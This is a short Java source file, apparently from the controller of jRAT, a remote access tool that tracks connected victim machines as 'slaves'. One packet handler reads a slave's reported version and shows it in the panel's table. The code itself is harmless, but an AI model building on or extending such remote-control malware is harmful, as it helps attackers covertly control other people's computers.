package pro.jrat.packets.incoming;

import java.io.DataInputStream;

import pro.jrat.Slave;
import pro.jrat.ui.frames.Frame;
import pro.jrat.utils.Util;


public class Packet30InitVersion extends AbstractIncomingPacket {

	public void read(Slave slave, DataInputStream dis) throws Exception {
		String version = slave.readLine();
		slave.setVersion(version);
		
		int row = Util.getRow(slave);
		
		Frame.mainModel.setValueAt(version, row, 9);
	}

}
